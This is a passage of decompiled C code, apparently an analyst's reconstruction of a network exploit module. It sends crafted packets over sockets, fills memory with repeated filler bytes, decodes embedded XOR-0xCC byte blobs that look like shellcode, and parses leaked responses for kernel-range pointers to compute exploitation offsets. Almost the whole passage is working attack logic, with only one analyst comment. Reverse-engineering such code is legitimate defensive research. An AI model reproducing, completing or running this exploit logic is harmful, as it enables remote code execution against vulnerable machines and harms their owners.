LABEL_9:
	Src = v14;
	if (!v14)
		return -1;
	*a11 += a10;
	v19 = CreateHeap(0x1000u);
	a8 = v19;
	if (!v19)
	{
	LABEL_13:
		GetAndFreeHeap(&Src);
		return -1;
	}
	a10 = 0;
	if (SockSendBuffer(s, v14, v13) || SockreceivData(&a10, s, 1, v19))
	{
		GetAndFreeHeap(&a8);
		goto LABEL_13;
	}
	v20 = a10;
	v21 = *(v19 + 9);
	v22 = CreateHeap(a10);
	*a12 = v22;
	if (v22)
	{
		*a13 = a10;
		memcpy(v22, v19, v20);
	}
	else
	{
		v21 = -1;
	}
	GetAndFreeHeap(&a8);
	GetAndFreeHeap(&Src);
	return v21;
}

//----- (681F3469) --------------------------------------------------------
int __stdcall sub_681F3469(SOCKET s, int a2, int a3, int a4, int a5, int a6, void *a7, void *Src, int a9)
{
	char *v9; // eax
	void *v10; // esi
	void *v11; // ST18_4
	void *v12; // esi
	_WORD *v13; // esi
	BOOL *v14; // esi
	char *v15; // eax
	char *v17; // edi
	int v18; // edi
	unsigned __int16 v19; // [esp+Ch] [ebp-8h]
	unsigned __int16 v20; // [esp+10h] [ebp-4h]
	int v21; // [esp+2Ch] [ebp+18h]

	v19 = 0;
	v20 = 0;
	if (Src && (v20 = 4117, v9 = CreateHeap(0x1015u), (v10 = v9) != 0))
	{
		*(v9 + 3) = 4096;
		*(v9 + 11) = 4096;
		*(v9 + 13) = 53;
		*(v9 + 15) = a7;
		*(v9 + 17) = 0;
		v11 = Src;
		*(v9 + 19) = 4096;
		*v9 = 9;
		memcpy(v9 + 21, v11, 0x1000u);
		a7 = v10;
	}
	else
	{
		a7 = 0;
	}
	Src = a7;
	if (!a7)
		goto LABEL_6;
	v19 = v20 + 36;
	v13 = Unk_SetIpAddress(v20 + 36, 51, 49159, a2, a3, a4, a5, a6);
	a6 = v13;
	if (!v13)
	{
		v14 = &Src;
	LABEL_9:
		GetAndFreeHeap(v14);
	LABEL_6:
		v12 = 0;
		goto LABEL_13;
	}
	v15 = CreateHeap((v20 + 36));
	v21 = v15;
	if (!v15)
	{
		GetAndFreeHeap(&Src);
		v14 = &a6;
		goto LABEL_9;
	}
	qmemcpy(v15, v13, 0x24u);
	memcpy(v15 + 36, a7, v20);
	GetAndFreeHeap(&Src);
	GetAndFreeHeap(&a6);
	v12 = v21;
LABEL_13:
	a7 = v12;
	if (!v12)
		return -1;
	if (a9)
	{
		v17 = CreateHeap(0x1000u);
		a9 = v17;
		if (!v17)
		{
			GetAndFreeHeap(&a7);
			return -1;
		}
		Src = 0;
		if (SockSendBuffer(s, v12, v19) || SockreceivData(&Src, s, 1, v17))
		{
			GetAndFreeHeap(&a9);
			v18 = -1;
		}
		else
		{
			v18 = *(v17 + 9);
			GetAndFreeHeap(&a9);
		}
	}
	else
	{
		v18 = SockSendBuffer(s, v12, v19);
	}
	GetAndFreeHeap(&a7);
	return v18;
}

//----- (681F35FA) --------------------------------------------------------
signed int  sub_681F35FA(SOCKET a1, __int16 a2, int a3, int a4, int a5, int a6, int a7, int a8, int a9, int a10, __int16 a11)
{
	SOCKET v11; // ebx
	signed int result; // eax
	char *v13; // edi
	signed int v14; // edi
	int Src; // [esp+4h] [ebp-4h]

	Src = 0;
	v11 = a1;
	a10 = sub_681F2C1E(a11, a2, a3, a4, a5, a6, a7, a8, a9, a10, &Src);
	if (!a10)
		return -1;
	v13 = CreateHeap(0x1000u);
	a8 = v13;
	if (v13)
	{
		a9 = 0;
		if (SockSendBuffer(v11, a10, Src) || SockreceivData(&a9, v11, 1, v13))
			v14 = -1;
		else
			v14 = *(v13 + 9);
		GetAndFreeHeap(&a8);
		GetAndFreeHeap(&a10);
		result = v14;
	}
	else
	{
		GetAndFreeHeap(&a10);
		result = -1;
	}
	return result;
}

//----- (681F369D) --------------------------------------------------------
signed int  sub_681F369D(SOCKET a1, __int16 a2, __int16 a3, LPVOID a4, int a5, char *a6)
{
	SOCKET v6; // ebx
	signed int result; // eax
	char *v8; // edi
	signed int v9; // edi
	int v10; // [esp+4h] [ebp-4h]

	v10 = 0;
	v6 = a1;
	a6 = Unk_ReturnByteArrayOfUnk_Exe(a2, a3, a4, a5, a6, &v10);
	if (!a6)
		return -1;
	v8 = CreateHeap(0x1000u);
	a4 = v8;
	if (v8)
	{
		a5 = 0;
		if (SockSendBuffer(v6, a6, v10) || SockreceivData(&a5, v6, 1, v8))
			v9 = -1;
		else
			v9 = *(v8 + 9);
		GetAndFreeHeap(&a4);
		GetAndFreeHeap(&a6);
		result = v9;
	}
	else
	{
		GetAndFreeHeap(&a6);
		result = -1;
	}
	return result;
}

//----- (681F3734) --------------------------------------------------------
int __stdcall SockProcessSendRecv(SOCKET s, int a2, int a3, int a4, int a5, int a6, int a7, void *Src)
{
	SIZE_T v8; // ebx
	void *v9; // esi
	_WORD *v10; // esi
	BOOL *v11; // esi
	char *v12; // eax
	char *v14; // edi
	signed int v15; // edi
	signed __int16 v16; // ax
	int v17; // [esp+Ch] [ebp-4h]

	LOWORD(v8) = 0;
	v17 = 0;
	Src = sub_681F2D82(&v17, Src);
	if (!Src)
		goto LABEL_2;
	v8 = (v17 + 36);
	v10 = Unk_SetIpAddress(v17 + 36, 162, 49159, a2, a3, a4, a5, a6);
	a6 = v10;
	if (!v10)
	{
		v11 = &Src;
	LABEL_5:
		GetAndFreeHeap(v11);
	LABEL_2:
		v9 = 0;
		goto LABEL_9;
	}
	v12 = CreateHeap(v8);
	a5 = v12;
	if (!v12)
	{
		GetAndFreeHeap(&Src);
		v11 = &a6;
		goto LABEL_5;
	}
	qmemcpy(v12, v10, 0x24u);
	memcpy(v12 + 36, Src, v17);
	GetAndFreeHeap(&Src);
	GetAndFreeHeap(&a6);
	v9 = a5;
LABEL_9:
	Src = v9;
	if (!v9)
		return -1;
	v14 = CreateHeap(0x1000u);
	a5 = v14;
	if (!v14)
	{
		GetAndFreeHeap(&Src);
		return -1;
	}
	a6 = 0;
	if (SockSendBuffer(s, v9, v8) || SockreceivData(&a6, s, 1, v14))
	{
		v15 = -1;
	}
	else
	{
		if (a6 < 0x2Bu)
			v16 = -1;
		else
			v16 = *(v14 + 21);
		v15 = *(v14 + 9);
		*a7 = v16;
	}
	GetAndFreeHeap(&a5);
	GetAndFreeHeap(&Src);
	return v15;
}

//----- (681F3863) --------------------------------------------------------
int  sub_681F3863(unsigned __int16 a1, SOCKET s, int a3, int a4, int a5, int a6, int a7, BOOL a8, BOOL a9, void *Src)
{
	char *v10; // ebx
	unsigned __int16 v11; // di
	_WORD *v12; // esi
	BOOL *v13; // esi
	size_t v14; // ST1C_4
	void *v15; // ST18_4
	char *v17; // edi
	signed int v18; // edi
	unsigned __int16 v19; // [esp+Ch] [ebp-8h]
	int v20; // [esp+10h] [ebp-4h]

	v19 = 0;
	v20 = 0;
	Src = sub_681F2E30(&v20, a1, a9, a8, Src);
	if (!Src)
		goto LABEL_2;
	v11 = v20 + 36;
	v19 = v20 + 36;
	v12 = Unk_SetIpAddress(v20 + 36, 47, 49159, a3, a4, a5, a6, a7);
	a8 = v12;
	if (!v12)
	{
		v13 = &Src;
	LABEL_5:
		GetAndFreeHeap(v13);
	LABEL_2:
		v10 = 0;
		goto LABEL_9;
	}
	v10 = CreateHeap(v11);
	if (!v10)
	{
		GetAndFreeHeap(&Src);
		v13 = &a8;
		goto LABEL_5;
	}
	v14 = v20;
	v15 = Src;
	qmemcpy(v10, v12, 0x24u);
	memcpy(v10 + 36, v15, v14);
	GetAndFreeHeap(&Src);
	GetAndFreeHeap(&a8);
LABEL_9:
	Src = v10;
	if (!v10)
		return -1;
	v17 = CreateHeap(0x1000u);
	a9 = v17;
	if (!v17)
	{
		GetAndFreeHeap(&Src);
		return -1;
	}
	a8 = 0;
	if (SockSendBuffer(s, v10, v19) || SockreceivData(&a8, s, 1, v17))
		v18 = -1;
	else
		v18 = *(v17 + 9);
	GetAndFreeHeap(&a9);
	GetAndFreeHeap(&Src);
	return v18;
}

//----- (681F3986) --------------------------------------------------------
int  sub_681F3986(unsigned __int16 a1, SOCKET s, int a3, int a4, int a5, int a6, int a7, void *a8, int a9, void *Src, int a11, int a12, int a13)
{
	unsigned __int16 v13; // bx
	unsigned __int16 v14; // di
	char *v15; // esi
	__int16 v16; // ax
	void *v17; // esi
	_WORD *v18; // esi
	BOOL *v19; // esi
	char *v20; // eax
	char *v22; // edi
	signed int v23; // ebx
	size_t v24; // esi
	LPVOID v25; // eax
	void **v26; // ecx
	int v27; // eax
	_WORD *v28; // ecx
	unsigned __int16 v29; // [esp+Ch] [ebp-4h]
	int v30; // [esp+2Ch] [ebp+1Ch]

	v13 = 0;
	v14 = a1;
	v29 = 0;
	if (!a1 || Src)
	{
		v13 = a1 + 19;
		v15 = CreateHeap((a1 + 19));
		if (v15)
		{
			v16 = a8;
			*v15 = 8;
			*(v15 + 11) = v16;
			if (v16)
				*(v15 + 13) = 66;
			*(v15 + 15) = a9;
			*(v15 + 17) = v14;
			if (v14)
				memcpy(v15 + 19, Src, v14);
			a8 = v15;
		}
		else
		{
			a8 = 0;
		}
	}
	else
	{
		a8 = 0;
	}
	a9 = a8;
	if (!a8)
		goto LABEL_12;
	v29 = v13 + 36;
	v18 = Unk_SetIpAddress(v13 + 36, 38, 49159, a3, a4, a5, a6, a7);
	Src = v18;
	if (!v18)
	{
		v19 = &a9;
	LABEL_15:
		GetAndFreeHeap(v19);
	LABEL_12:
		v17 = 0;
		goto LABEL_19;
	}
	v20 = CreateHeap((v13 + 36));
	v30 = v20;
	if (!v20)
	{
		GetAndFreeHeap(&a9);
		v19 = &Src;
		goto LABEL_15;
	}
	qmemcpy(v20, v18, 0x24u);
	memcpy(v20 + 36, a8, v13);
	GetAndFreeHeap(&a9);
	GetAndFreeHeap(&Src);
	v17 = v30;
LABEL_19:
	a8 = v17;
	if (!v17)
		return -1;
	if (a13)
	{
		v22 = CreateHeap(0x1000u);
		a9 = v22;
		if (!v22)
		{
			GetAndFreeHeap(&a8);
			return -1;
		}
		a13 = 0;
		if (SockSendBuffer(s, v17, v29) || SockreceivData(&a13, s, 1, v22))
		{
			GetAndFreeHeap(&a9);
			v23 = -1;
		}
		else
		{
			v24 = a13;
			v23 = *(v22 + 9);
			v25 = CreateHeap(a13);
			v26 = a11;
			*a11 = v25;
			if (v25)
			{
				*a12 = a13;
				memcpy(*v26, v22, v24);
			}
			else
			{
				v23 = -1;
			}
			GetAndFreeHeap(&a9);
		}
	}
	else
	{
		v27 = SockSendBuffer(s, v17, v29);
		v28 = a12;
		v23 = v27;
		*a11 = 0;
		*v28 = 0;
	}
	GetAndFreeHeap(&a8);
	return v23;
}

//----- (681F3B5D) --------------------------------------------------------
int __stdcall sub_681F3B5D(SOCKET s, int a2, int a3, int a4, int a5, int a6)
{
	char *v6; // esi
	char *v8; // ebx
	char *v9; // [esp+4h] [ebp-8h]
	int v10; // [esp+8h] [ebp-4h]

	v6 = CreateHeap(0xF000u);
	v9 = v6;
	if (!v6)
		return -1;
	*(v6 + 2055) = 912847747;
	memset(v6 + 2059, 84, 0xE7F4u);
	v10 = 0;
	v8 = 976;
	while (!sub_681F3469(s, a2, a3, a4, a5, a6, v8, v6, 0))
	{
		v8 += 4096;
		++v10;
		v6 += 4096;
		if (v10 >= 15)
		{
			GetAndFreeHeap(&v9);
			return sub_681F369D(s, a2, a3, a4, a5, a6);
		}
	}
	GetAndFreeHeap(&v9);
	return -1;
}

//----- (681F3C0A) --------------------------------------------------------
int __stdcall sub_681F3C0A(SOCKET s, int a2, int a3, int a4, int a5, int a6)
{
	char *v6; // eax
	char *v7; // esi
	unsigned int v9; // eax
	int v10; // edi
	char *v11; // [esp+4h] [ebp-4h]

	v6 = CreateHeap(0x1000u);
	v7 = v6;
	v11 = v6;
	if (!v6)
		return -1;
	memset(v6, 84, 0xB8Cu);
	v9 = 0;
	do
	{
		v7[v9 + 2956] = WhatIsThisL176[v9];
		++v9;
	} while (v9 < 0xAF);
	memset(v7 + 3131, 84, 0x3C5u);
	v10 = sub_681F3469(s, a2, a3, a4, a5, a6, 0xF3D0, v7, 1);
	if (v10 == -1073741811)
		v10 = 0;
	GetAndFreeHeap(&v11);
	return v10;
}

//----- (681F3CA0) --------------------------------------------------------
signed int  sub_681F3CA0(char a1, SOCKET a2)
{
	char v2; // bl
	_WORD *v3; // esi
	unsigned int v5; // eax
	_BYTE *v6; // eax
	signed int v7; // edi
	int v8; // edi
	_WORD *v9; // [esp+8h] [ebp-8h]
	SIZE_T dwBytes; // [esp+Ch] [ebp-4h]

	dwBytes = 0;
	v2 = a1;
	if (!a1)
		dwBytes = 132;
	if (a1 == 1)
		dwBytes = 2920;
	if (a1 == 2)
		dwBytes = 1152;
	v3 = CreateHeap(dwBytes);
	v9 = v3;
	if (!v3)
		return -1;
	if (!v2)
	{
		v3[1] = 63487;
		v3[2] = CheckIfTimePassed();
		v3[3] = CheckIfTimePassed();
	}
	if (v2 == 1)
	{
		*(v3 + 8) = 3;
		*(v3 + 40) = 3;
		*(v3 + 40) = 4291821744;                    // What is this? It looks like these numbers should be positive, but this also makes them large. Not sure what to think.
		*(v3 + 41) = 4294967295;
		*(v3 + 42) = 4291821744;
		*(v3 + 43) = 4294967295;
		*(v3 + 48) = 4292866240;
		*(v3 + 49) = 4292866240;
		*(v3 + 99) = 4292866448;
		*(v3 + 101) = 4292866544;
		*(v3 + 118) = 4291822064;
		*(v3 + 119) = 4294967295;
		*(v3 + 122) = 4291822080;
		*(v3 + 123) = 4294967295;
		v5 = 0;
		do
		{
			*(v3 + v5 + 497) = byte_682023B0[v5] ^ 0xCC;
			++v5;
		} while (v5 < 0x977);
	}
	if (v2 == 2)
	{
		v6 = v3;
		v7 = 1147;
		do
		{
			*v6 = v6[byte_68202D27 - v3] ^ 0xCC;
			++v6;
			--v7;
		} while (v7);
	}
	v8 = SockSendBuffer(a2, v3, dwBytes);
	GetAndFreeHeap(&v9);
	return v8;
}

//----- (681F3DD7) --------------------------------------------------------
int __stdcall CreateAndGetHeap(SOCKET s, int a2, int a3, int a4, int a5, int a6, int a7, int a8, int a9, int a10, int a11, int a12)
{
	int result; // eax
	_DWORD *v13; // eax
	const void *v14; // ecx
	int v15; // esi
	int v16; // eax
	int v17; // eax
	int v18; // edi
	char v19[5]; // [esp+0h] [ebp-10h]
	int v20; // [esp+8h] [ebp-8h]
	int v21; // [esp+Ch] [ebp-4h]

	if (!a9)
		return -1;
	v20 = a8 + 12;
	v13 = CreateHeap(v20);
	v14 = (a11 + a9);
	v15 = v13;
	*v13 = a10;
	v16 = *a12;
	*(v15 + 4) = a8;
	v21 = v15;
	*(v15 + 8) = v16;
	memcpy((v15 + 12), v14, a8);
	*&v19[1] = 0;
	v17 = 0;
	*v19 = a7;
	do
	{
		*(v17 + v15) ^= v19[v17 % 4];
		++v17;
	} while (v17 < v20);
	a10 = 0;
	a9 = 0;
	if (sub_681F330E(s, a2, a3, a4, a5, a6 + 1, 242, v15, (v15 + 12), a8, a12, &a9, &a10) == -1)
	{
		GetAndFreeHeap(&a9);
		GetAndFreeHeap(&v21);
		result = -1;
	}
	else
	{
		GetAndFreeHeap(&v21);
		v18 = *(a9 + 26);
		GetAndFreeHeap(&a9);
		result = (v18 == 17) - 1;
	}
	return result;
}

//----- (681F3EC8) --------------------------------------------------------
int  SocketProcessSocket_1(char *a1, SOCKET s, int a3, int a4, int a5, int a6, int a7, int a8)
{
	char *v8; // edi
	int v9; // eax
	char v11; // al
	_DWORD *v12; // esi
	char v13; // dl
	int v14; // ecx
	signed int v15; // ebx
	int v16; // edi
	int v17; // edi
	_DWORD *v18; // [esp+Ch] [ebp-Ch]
	int v19; // [esp+10h] [ebp-8h]
	int v20; // [esp+14h] [ebp-4h]

	v8 = a1;
	*a1 = 0;
	while (1)
	{
		v9 = SockProcessSendRecv(s, a3, a4, a5, a6, a7, a8, *v8);
		if (v9 == -1)
			return -1;
		if (!v9)
			break;
		if (++*v8 >= 2u)
			return -1;
	}
	if (sub_681F35FA(s, 84, 49159, a3, a4, a5, a6, a7, 3, *v8, *a8))
		return -1;
	v20 = 0;
	v11 = *v8;
	if (!*v8)
		v20 = 72;
	if (v11 == 1)
		v20 = 56;
	v19 = (v20 + 1056);
	v12 = CreateHeap(v19);
	v18 = v12;
	if (!v12)
		return -1;
	v13 = *v8;
	if (!*v8)
	{
		v14 = v19;
		*v12 = 50331653;
		v12[1] = 16;
		v12[2] = v14;
		v12[3] = 1;
		v12[4] = 1104;
		v12[5] = 2949120;
		v12[6] = 3334824;
		v12[7] = 1;
		v12[9] = 1;
		v12[11] = 3270056;
		v12[12] = 69207072;
		v12[13] = 1733312;
		v12[14] = 528;
		v12[16] = 528;
	}
	if (v13 == 1)
	{
		*v12 = 50331653;
		v12[1] = 16;
		v12[2] = v19;
		v12[3] = 1;
		v12[4] = 1088;
		v12[5] = 0x80000;
		v12[7] = 100;
		v12[8] = 100;
		v12[9] = 100;
		v12[10] = 3178816;
		v12[11] = 22;
		v12[12] = 1332248;
		v12[13] = 22;
	}
	if (!v13)
		v20 += 65532;
	v15 = 0;
	v16 = v12 + v20;
	do
		*(v16 + v15++) = rand() + 1;
	while (v15 < 1056);
	v17 = sub_681F3863(v19, s, a3, a4, a5, a6, a7, *a8, 14, v12);
	GetAndFreeHeap(&v18);
	return v17;
}

//----- (681F407B) --------------------------------------------------------
int  SocketProcessSocket_2(_WORD *a1, SOCKET s, int a3, int a4, int a5, int a6, int a7)
{
	int v8; // ST14_4
	char *v9; // eax
	char *v10; // eax
	char *v11; // ebx
	int v12; // ebx
	BOOL *v13; // esi
	int v14; // [esp+0h] [ebp-20h]
	unsigned int v15; // [esp+4h] [ebp-1Ch]
	char *i; // [esp+8h] [ebp-18h]
	int v17; // [esp+Ch] [ebp-14h]
	int Src; // [esp+10h] [ebp-10h]
	char v19[4]; // [esp+14h] [ebp-Ch]
	int v20; // [esp+18h] [ebp-8h]
	void *Dst; // [esp+1Ch] [ebp-4h]

	v14 = a4;
	if (sub_681F3061(s, a3, &v14, a5, a6, *a1))
		return -1;
	Dst = CreateHeap(0x8Eu);
	if (!Dst)
		return -1;
	Src = 0;
	*v19 = CreateHeap(0x1000u);
	if (*v19)
	{
		v8 = ++*a1;
		v17 = 0;
		v15 = 0;
		v20 = 0x8000;
		v9 = sub_681F2C1E(a7, 32256, 49159, a3, a4, a5, a6, v8, 0, 255, &Src);
		for (i = v9; v9; i = v9)
		{
			memcpy(Dst, v9, Src);
			GetAndFreeHeap(&i);
			v10 = sub_681F2C1E(a7, v20 - 512, 49159, a3, v14, a5, a6, *a1, 0, 255, &Src);
			i = v10;
			if (!v10)
				break;
			v11 = Dst;
			memcpy(Dst + 71, v10, Src);
			GetAndFreeHeap(&i);
			if (SockSendBuffer(s, v11, 142) || (v12 = *v19, SockreceivData(&v17, s, 2, v19[0])))
			{
				GetAndFreeHeap(v19);
				goto LABEL_18;
			}
			if (*(v12 + 9))
				break;
			v15 += v20;
			v20 += 4096;
			if (v20 > 0xC000u)
				v20 = 0x8000;
			if (v15 >= 0x100000)
			{
				if (SocketUseSocket1(s, a3, v14, a5, a6, *a1))
					break;
				GetAndFreeHeap(&Dst);
				GetAndFreeHeap(v19);
				Sleep(0x456u);
				v17 = 0;
				while (!sub_681F35FA(s, 65152, 49159, a3, a4, a5, a6, ++*a1, 0, 255, a7))
				{
					if (++v17 > 0x37u)
						return 0;
				}
				return -1;
			}
			v9 = sub_681F2C1E(a7, v20 - 512, 49159, a3, a4, a5, a6, ++*a1, 0, 255, &Src);
		}
		GetAndFreeHeap(&Dst);
		v13 = v19;
	}
	else
	{
	LABEL_18:
		v13 = &Dst;
	}
	GetAndFreeHeap(v13);
	return -1;
}

//----- (681F42DF) --------------------------------------------------------
int __stdcall sub_681F42DF(SOCKET s, int a2, int a3, int a4, int a5, int a6, int a7)
{
	_BYTE *v7; // esi
	char *v9; // esi
	int v10; // edx
	unsigned int v11; // ebx
	unsigned int v12; // esi
	__int16 v13; // cx
	bool v14; // al
	int v15; // edi
	unsigned int v16; // esi
	unsigned int v17; // esi
	__int16 v18; // ax
	int v19; // ecx
	int v20; // ebx
	int v21; // ecx
	__int16 v22; // dx
	__int16 v23; // ax
	__int64 v24; // [esp+Ch] [ebp-40h]
	SIZE_T v25; // [esp+14h] [ebp-38h]
	int v26; // [esp+18h] [ebp-34h]
	int v27; // [esp+1Ch] [ebp-30h]
	void *v28; // [esp+20h] [ebp-2Ch]
	int v29; // [esp+24h] [ebp-28h]
	void *v30; // [esp+28h] [ebp-24h]
	int v31; // [esp+2Ch] [ebp-20h]
	int v32; // [esp+30h] [ebp-1Ch]
	int v33; // [esp+34h] [ebp-18h]
	void *Src; // [esp+38h] [ebp-14h]
	char *v35; // [esp+3Ch] [ebp-10h]
	int v36; // [esp+40h] [ebp-Ch]
	unsigned int v37; // [esp+44h] [ebp-8h]
	char v38; // [esp+4Bh] [ebp-1h]

	v7 = CreateHeap(0x10u);
	v28 = v7;
	if (!v7)
		return -1;
	v27 = -1;
	v7[15] = rand();
	v31 = 0;
	v29 = 0;
	v33 = 0;
	v38 = 0;
	v36 = 2;
	Src = sub_681F2C1E(a7, 65152, 49159, a2, a3, a4, a5, 2, 1, 255, &v31);
	if (!Src)
		goto LABEL_74;
	while (1)
	{
		v32 = v31;
		v25 = (7 * v31);
		v9 = CreateHeap(v25);
		v35 = v9;
		if (!v9)
			goto LABEL_72;
		v37 = 0;
		do
		{
			v26 = v37;
			if (v37 == 2)
			{
				memcpy(&v9[2 * v32], Src, v32);
			}
			else
			{
				v30 = sub_681F2C1E(a7, 65152, 49159, a2, a3, a4, a5, ++*a6, 1, 255, &v32);
				if (!v30)
					goto LABEL_71;
				memcpy(&v9[v26 * v32], v30, v32);
				GetAndFreeHeap(&v30);
				v9 = v35;
			}
			++v37;
		} while (v37 <= 6u);
		v30 = CreateHeap(0x1000u);
		if (!v30)
		{
		LABEL_71:
			GetAndFreeHeap(&v35);
			goto LABEL_72;
		}
		v26 = 0;
		v32 = SockSendBuffer(s, v9, v25) ? -1 : SockreceivData(&v26, s, 7, v30);
		GetAndFreeHeap(&v30);
		GetAndFreeHeap(&v35);
		if (v32)
		{
		LABEL_72:
			GetAndFreeHeap(&Src);
			goto LABEL_74;
		}
		GetAndFreeHeap(&Src);
		if (sub_681F3986(0x10u, s, a2, a3, a4, a5, v36, 1, 0, v28, &v33, &v29, 1))
			goto LABEL_74;
		if (v33)
		{
			if (v29 > 0x39u)
			{
				v10 = *(v33 + 51);
				v11 = v10 + v33 + 4;
				v12 = v29 + v33 - 49;
				if (v11 < v12)
				{
					v13 = *(v33 + 28);
					v37 = v10 + v33 + 4;
					while (v13 != *(v11 + 42) || *(v33 + 32) != *(v11 + 46) || *(v33 + 30) != *(v11 + 44) || *(v11 + 36) != 1)
					{
						if (++v11 >= v12)
							goto LABEL_68;
					}
					v14 = Dummy_StackSettup(*(v11 - 16));
					byte_6820F8FC = v14;
					if (v14)
					{
						v24 = *(v11 - 16);
						v15 = v11 - 16;
						v16 = v11 - 112;
					}
					else
					{
						v17 = *(v11 - 16);
						if (v17 < 0x80000000)
							goto LABEL_68;
						v24 = v17;
						v15 = v11 - 8;
						v16 = v11 - 48;
					}
					if (v16 > v37)
						break;
				}
			}
		}
	LABEL_68:
		GetAndFreeHeap(&v33);
		if (++v38 < 3u)
		{
			Src = sub_681F2C1E(a7, 65152, 49159, a2, a3, a4, a5, ++v36, 1, 255, &v31);
			if (Src)
				continue;
		}
		goto LABEL_74;
	}
	if (v14)
	{
		while (*v16 != 12
			|| *(v16 + 1) != 2
			|| *(v16 + 2) <= 0xFE80u
			|| !Dummy_StackSettup(*(v16 + 8))
			|| !Dummy_StackSettup(*(v16 + 16))
			|| !Dummy_StackSettup(*(v16 + 24))
			|| !Dummy_StackSettup(*(v16 + 32)))
		{
			v16 -= 4;
			if (v16 <= v37)
				goto LABEL_68;
		}
		qword_6820FAD0 = *(v16 + 8);
		dword_6820FAD8 = *(v16 + 16);
		dword_6820FADC = *(v16 + 20);
	}
	else
	{
		while (*v16 != 12
			|| *(v16 + 1) != 2
			|| *(v16 + 2) <= 0xFE80u
			|| *(v16 + 8) < 0x80000000
			|| *(v16 + 12) < 0x80000000
			|| *(v16 + 16) < 0x80000000
			|| *(v16 + 20) < 0x80000000)
		{
			v16 -= 4;
			if (v16 <= v37)
				goto LABEL_68;
		}
		LODWORD(qword_6820FAD0) = *(v16 + 8);
		dword_6820FADC = 0;
		qword_6820FAD0 = qword_6820FAD0;
		dword_6820FAD8 = *(v16 + 12);
	}
	v18 = *(v11 + 48);
	v19 = *(v16 + 2);
	v20 = *v11;
	word_6820FB44 = v18;
	*&qword_6820FAE8 = v24 + 65152 - v19;
	dword_6820FB38 = 0;
	v21 = -v20 - (65152 - v19);
	word_6820FB2C = 1;
	dword_6820FB08 = v16 - v37 + 65148;
	word_6820FB28 = v15 - v16 - 4;
	LOWORD(dword_6820FB10) = v15 - v16 - 16;
	LOWORD(dword_6820FB24) = v15 - v16;
	dword_6820FB0C = v15 - v16 + 32;
	LOWORD(dword_6820FB14) = v15 - v16 + 4;
	LOWORD(dword_6820FB18) = v15 - v16 + 56;
	if (!v20)
		dword_6820FB38 = 1;
	v22 = 0;
	LOWORD(dword_6820FB1C) = v15 - v16 + 56;
	if (!byte_6820F8FC)
	{
		word_6820FB20 = dword_6820FB10 - 8;
		if (v21 == 156)
		{
			v23 = dword_6820FB18 + 24;
		}
		else
		{
			if (v21 != 164)
			{
			LABEL_66:
				LOWORD(dword_6820FB1C) = v22;
				goto LABEL_67;
			}
			v23 = dword_6820FB18 + 23;
		}
		v22 = v23;
		goto LABEL_66;
	}
	LOWORD(dword_6820FB14) = dword_6820FB14 + 4;
	dword_6820FB0C += 8;
	LOWORD(dword_6820FB10) = dword_6820FB10 - 16;
	LOWORD(dword_6820FB18) = v15 - v16 + 64;
	word_6820FB28 -= 4;
	word_6820FB20 = dword_6820FB10 - 12;
	if (v21 == 228)
	{
		LOWORD(dword_6820FB1C) = dword_6820FB1C + 44;
	}
	else if (v21 == 252)
	{
		LOWORD(dword_6820FB1C) = dword_6820FB1C + 43;
	}
	else
	{
		LOWORD(dword_6820FB1C) = 0;
	}
LABEL_67:
	word_6820FB30 = dword_6820FB1C - 2;
	word_6820FB34 = 0;
	if (!dword_6820FB1C)
		goto LABEL_68;
	v27 = 0;
	word_6820FB34 = dword_6820FB18 - 11;
LABEL_74:
	GetAndFreeHeap(&v33);
	GetAndFreeHeap(&v28);
	return v27;
}
// 6820F8FC: using guessed type char byte_6820F8FC;
// 6820FAD0: using guessed type __int64 qword_6820FAD0;
// 6820FAD8: using guessed type int dword_6820FAD8;
// 6820FADC: using guessed type int dword_6820FADC;
// 6820FB08: using guessed type int dword_6820FB08;
// 6820FB0C: using guessed type int dword_6820FB0C;
// 6820FB10: using guessed type int dword_6820FB10;
// 6820FB14: using guessed type int dword_6820FB14;
// 6820FB18: using guessed type int dword_6820FB18;
// 6820FB1C: using guessed type int dword_6820FB1C;
// 6820FB20: using guessed type __int16 word_6820FB20;
// 6820FB24: using guessed type int dword_6820FB24;
// 6820FB28: using guessed type __int16 word_6820FB28;
// 6820FB2C: using guessed type __int16 word_6820FB2C;
// 6820FB30: using guessed type __int16 word_6820FB30;
// 6820FB34: using guessed type __int16 word_6820FB34;
// 6820FB38: using guessed type int dword_6820FB38;
// 6820FB44: using guessed type __int16 word_6820FB44;

//----- (681F4820) --------------------------------------------------------
signed int  sub_681F4820(void *a1, SOCKET s, int a3, int a4, int a5, int a6, int a7, int a8, int a9, int a10)
{
	void *v10; // edi
	unsigned __int16 v11; // si
	char *v12; // eax
	int v14; // edi
	int v15; // [esp+8h] [ebp-4h]

	v10 = a1;
	v11 = a1 + 15;
	v12 = CreateHeap((a1 + 15));
	v15 = v12;
	if (!v12)
		return -1;
	if (v10 == 4)
		*(v12 + 15) = a8;
	if (v10 == 8)
	{
		*(v12 + 15) = a8;
		*(v12 + 19) = a9;
	}
	v14 = sub_681F3986(v11, s, a3, a4, a5, a6, a7, v10, a10, v12, &v15, &a10, 0);
	GetAndFreeHeap(&v15);
	return v14;
}

//----- (681F489C) --------------------------------------------------------
int  sub_681F489C(_WORD *a1, _WORD *a2, SOCKET s, int a4, int a5, int a6, __int16 a7)
{
	_WORD *v7; // ebx
	_WORD *v8; // edi
	char *v10; // esi
	void *v11; // eax
	int v12; // ST40_4
	int v13; // eax
	int v14; // edi
	SIZE_T v15; // [esp+Ch] [ebp-20h]
	int v16; // [esp+10h] [ebp-1Ch]
	int v17; // [esp+14h] [ebp-18h]
	void *v18; // [esp+18h] [ebp-14h]
	void *Src; // [esp+1Ch] [ebp-10h]
	int v20; // [esp+20h] [ebp-Ch]
	char *v21; // [esp+24h] [ebp-8h]
	int v22; // [esp+28h] [ebp-4h]

	v20 = 0;
	v7 = a1;
	v8 = a2;
	Src = sub_681F2C1E(a7, 65152, 49159, a4, a5, *a2, a6, a7, 0, 255, &v20);
	if (!Src)
		return -1;
	v20 = v20;
	v17 = *v8;
	v15 = (7 * v20);
	v10 = CreateHeap(v15);
	v21 = v10;
	if (!v10)
		goto LABEL_16;
	v22 = 0;
	do
	{
		v16 = v22;
		if (v22 == 2)
		{
			memcpy(&v10[2 * v20], Src, v20);
		}
		else
		{
			v18 = sub_681F2C1E(a7, 65152, 49159, a4, a5, v17, a6, ++*v7, 0, 255, &v20);
			if (!v18)
				goto LABEL_13;
			memcpy(&v10[v16 * v20], v18, v20);
			GetAndFreeHeap(&v18);
			v10 = v21;
		}
		++v22;
	} while (v22 <= 6u);
	v18 = CreateHeap(0x1000u);
	if (!v18)
	{
	LABEL_13:
		GetAndFreeHeap(&v21);
